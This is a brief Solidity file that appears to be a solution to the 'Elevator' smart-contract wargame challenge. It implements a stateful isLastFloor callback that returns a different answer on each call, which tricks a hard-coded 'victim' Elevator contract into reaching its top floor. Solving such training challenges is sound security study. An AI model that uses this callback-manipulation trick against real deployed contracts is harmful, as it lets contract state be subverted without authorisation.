// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";

contract Solve {
    // create & run()
    bool _isCalled;

    modifier called {
        _;
        _isCalled = true;
    }

    function run() external {
        Elevator victim = Elevator(0xbe1f8cc60d791f130d9d1e3ac625f3B1a0a8adb0);
        victim.goTo(0); // any number
    }

    function isLastFloor(uint256) external called returns (bool) {
        return _isCalled;
    }
}